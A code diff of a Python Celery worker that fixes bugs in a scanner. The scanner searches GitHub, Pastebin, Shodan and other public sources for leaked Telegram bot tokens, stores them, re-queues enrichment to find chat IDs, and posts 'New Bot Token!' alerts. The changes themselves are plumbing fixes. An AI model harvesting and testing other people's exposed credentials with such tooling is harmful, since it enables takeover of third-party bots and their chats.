@@ -10,7 +10,6 @@ from app.core.database import db
 from app.core.security import security
 from app.services.scanners import (
     FofaService,
-    GithubGistService,
     GithubService,
     GitlabService,
     GrepAppService,
@@ -19,7 +18,13 @@ from app.services.scanners import (
     ShodanService,
     UrlScanService,
 )
-from app.services.scanners_extension import GoogleSearchService, BitbucketService, NetlasService
+from app.services.scanners_extension import (
+    GoogleSearchService,
+    BitbucketService,
+    NetlasService,
+    GithubGistService,   # BUG-001: was incorrectly imported from scanners.py
+    PublicWwwService,    # BUG-002: needed for publicwww_srv instantiation
+)
 from app.workers.celery_app import app
 from app.workers.tasks.flow_tasks import (  # Import for triggering and DB
     async_execute,
@@ -44,6 +49,7 @@ pastebin_srv = PastebinService()
 serper_srv = SerperService()
 google_srv = GoogleSearchService()
 netlas_srv = NetlasService()
+publicwww_srv = PublicWwwService()  # BUG-002: was missing, caused NameError in scan_publicwww
 
 
 def _calculate_hash(token: str) -> str:
@@ -192,10 +198,13 @@ async def _save_credentials_async(results, source_name: str):
                     saved_count += 1
 
                 elif existing_id and not chat_id:
-                    # Token exists but still no chat_id found in this scan
-                    # Trigger enrichment anyway to try recursive discovery
-                    enrich_credential.delay(existing_id)
-                    pass
+                    # BUG-010: Gate re-queue with Redis cooldown to prevent unbounded task flooding
+                    from app.core.redis_srv import redis_srv
+                    cooldown_key = f"enrich_requeue:{existing_id}"
+                    if not redis_srv.is_on_cooldown(cooldown_key):
+                        enrich_credential.delay(existing_id)
+                        redis_srv.set_cooldown(cooldown_key, 3600)  # 1-hour cooldown per credential
+
                 elif not existing_id:
                     # INSERT new record
                     new_data = {
@@ -223,10 +232,8 @@ async def _save_credentials_async(results, source_name: str):
                         new_id = res.data[0]["id"]
                         status_label = "✅ ACTIVE" if chat_id else "⏳ PENDING"
 
-                        from app.services.broadcaster_srv import BroadcasterService
-
-                        broadcaster = BroadcasterService()
-                        await broadcaster.send_log(
+                        from app.workers.tasks.flow_tasks import get_broadcaster
+                        await get_broadcaster().send_log(
                             f"🎯 [{source_name}] **New Bot Token!**\n"
                             f"Bot: @{bot_username}\n"
                             f"ID: `{new_id}`\n"
@@ -246,8 +253,9 @@ async def _save_credentials_async(results, source_name: str):
 
 
 def _run_sync(coro):
-    """Helper to run async code in sync Celery task"""
-    return asyncio.run(coro)
+    """Helper to run async code in sync Celery task using persistent worker loop (BUG-008)."""
+    from app.workers.celery_app import get_worker_loop
+    return get_worker_loop().run_until_complete(coro)
 
 
 def _save_credentials(results, source_name: str):
@@ -255,9 +263,8 @@ def _save_credentials(results, source_name: str):
 
 
 async def _send_log_async(message: str):
-    from app.services.broadcaster_srv import BroadcasterService
-
-    broadcaster = BroadcasterService()
+    from app.workers.tasks.flow_tasks import get_broadcaster
+    broadcaster = get_broadcaster()
     await broadcaster.send_log(message)
 
 
